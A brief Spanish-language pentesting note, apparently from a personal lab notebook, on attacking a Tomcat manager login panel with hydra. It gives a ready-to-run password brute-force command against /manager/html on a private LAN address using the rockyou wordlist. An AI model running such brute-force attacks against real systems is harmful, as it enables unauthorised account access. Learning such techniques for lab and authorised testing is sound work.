Podemos atacar el panel de login de un tomcat con hydra de la siguiente forma:
![[Pasted image 20240613010539.png]]

```bash
hydra -t 64 -l tomcat -P /usr/share/wordlists/rockyou.txt -f 192.168.0.43 -s 8080 http-get /manager/html
```

![[Pasted image 20240613010545.png]]